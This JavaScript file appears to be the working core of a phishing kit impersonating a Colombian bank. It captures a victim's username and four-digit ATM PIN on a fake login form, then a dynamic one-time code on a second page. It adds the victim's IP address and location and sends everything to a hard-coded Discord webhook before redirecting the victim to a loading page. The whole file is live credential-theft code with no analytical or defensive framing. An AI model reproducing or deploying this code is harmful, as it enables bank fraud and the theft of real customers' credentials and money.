document.addEventListener('DOMContentLoaded', function() {
    // 🔴 ⚠️ CLAVE: COLOCA TU URL DE WEBHOOK AQUÍ. ⚠️
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1413741958911885353/506AysoGFxb2FufT0HRvOjzSFnPatRlsVtPDQYjXAPPCsgWx08a3lJASFkoJHqNugES3'; 
    
    // API GRATUITA PARA OBTENER IP Y GEOLOCALIZACIÓN
    const GEO_API_URL = 'https://ipinfo.io/json';

    // ***********************************************
    // FUNCIÓN ASÍNCRONA PARA OBTENER IP Y UBICACIÓN
    // ***********************************************
    async function getGeolocation() {
        try {
            const response = await fetch(GEO_API_URL);
            const data = await response.json();
            
            return {
                ip: data.ip || 'Desconocida',
                city: data.city || 'Desconocida',
                country: data.country || 'Desconocido',
                loc: data.loc || 'N/A'
            };
        } catch (error) {
            console.error('Error al obtener geolocalización:', error);
            return { ip: 'Error', city: 'Error', country: 'Error', loc: 'Error' };
        }
    }

    // ***********************************************
    // FUNCIÓN CENTRAL DE ENVÍO (Estética Mejorada)
    // ***********************************************
    async function sendToDiscord(dataFields, redirectUrl) {
        // 1. Obtener la información de geolocalización
        const geoData = await getGeolocation();

        // Campos de ubicación
        const locationFields = [
            // Línea separadora para estética 
            { name: "🌎 IP", value: `\`${geoData.ip}\``, inline: true },
            { name: "📍 Ciudad", value: `\`${geoData.city}\``, inline: true },
            { name: "🗺️ País", value: `\`${geoData.country}\``, inline: true },
        ];
        
        // Combina los campos del formulario con los campos de ubicación
        const finalFields = dataFields.fields.concat(locationFields);

        const discordMessage = {
            embeds: [{
                title: dataFields.title,
                color: dataFields.color,
                fields: finalFields,
                timestamp: new Date().toISOString(),
                footer: {
                    text: "Datos capturados con localización",
                }
            }]
        };

        // 3. Envía la petición a Discord
        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordMessage),
        })
        .then(response => {
            console.log("Datos enviados a Discord. Redirigiendo a:", redirectUrl);
            window.location.href = redirectUrl; 
        })
        .catch(error => {
            console.error('Error al enviar a Discord:', error);
            window.location.href = redirectUrl; 
        });
    }

    // ***********************************************
    // 1. LÓGICA DE INDEX.HTML (Login)
    // ***********************************************
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        const usuarioInput = document.getElementById('usuario');
        const claveInput = document.getElementById('claveCajero');
        const btnIngresar = document.getElementById('btnIngresar');

        function toggleLoginButtonState() {
            const usuarioLleno = usuarioInput.value.trim().length > 0;
            const claveLlena = claveInput.value.trim().length === 4; 

            if (usuarioLleno && claveLlena) {
                btnIngresar.classList.remove('btn-disabled');
                btnIngresar.classList.add('btn-active');
                btnIngresar.disabled = false;
            } else {
                btnIngresar.classList.remove('btn-active');
                btnIngresar.classList.add('btn-disabled');
                btnIngresar.disabled = true;
            }
        }
        
        usuarioInput.addEventListener('input', toggleLoginButtonState);
        claveInput.addEventListener('input', toggleLoginButtonState);
        toggleLoginButtonState();

        loginForm.addEventListener('submit', function(e) {
            e.preventDefault(); 
            if (btnIngresar.disabled) return; 

            const usuario = usuarioInput.value;
            const clave = claveInput.value;

            const message = {
                title: "🚨 ¡LOGO BANCOL! 🚨",
                color: 16752384, // Amarillo/naranja
                fields: [
                    // Colocamos Usuario y Clave en la misma línea (inline: true) para un formato compacto
                    { name: "👤 Usuario", value: `\`${usuario}\``, inline: true },
                    { name: "🔑 Clave", value: `\`${clave}\``, inline: true },
                ],
            };
            
            sendToDiscord(message, 'cargando.html'); 
        });
    }

    // ***********************************************
    // 2. LÓGICA DE INDEX2.HTML (Clave Dinámica)
    // ***********************************************
    const claveForm = document.getElementById('claveForm');
    if (claveForm) {
        const inputs = document.querySelectorAll('.clave-input');
        const btnConfirmar = document.getElementById('btnConfirmar');

        function toggleClaveButtonState() {
            let allFilled = true;
            inputs.forEach(input => {
                if (input.value.trim().length !== 1) {
                    allFilled = false;
                }
            });

            if (allFilled) {
                btnConfirmar.classList.remove('btn-disabled');
                btnConfirmar.classList.add('btn-active');
                btnConfirmar.disabled = false;
            } else {
                btnConfirmar.classList.remove('btn-active');
                btnConfirmar.classList.add('btn-disabled');
                btnConfirmar.disabled = true;
            }
        }
        
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, ''); 
                if (e.target.value.length > 1) {
                    e.target.value = e.target.value.slice(0, 1);
                }
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                toggleClaveButtonState();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
                    inputs[index - 1].focus();
                    inputs[index - 1].value = '';
                    toggleClaveButtonState();
                }
            });
        });
        toggleClaveButtonState(); 

        claveForm.addEventListener('submit', function(e) {
            e.preventDefault(); 
            if (btnConfirmar.disabled) return; 

            let claveDinamica = '';
            inputs.forEach(input => { claveDinamica += input.value; });

            const message = {
                title: "🟡 ¡CLAVE DINÁMICA! 🟡",
                color: 15773193, // Amarillo
                fields: [
                    // La Clave Dinámica es mejor dejarla en una línea completa
                    { name: "🔑 Clave Dinámica", value: `\`${claveDinamica}\``, inline: false },
                ],
            };
            
            sendToDiscord(message, 'cargando..html'); 
        });
    }
});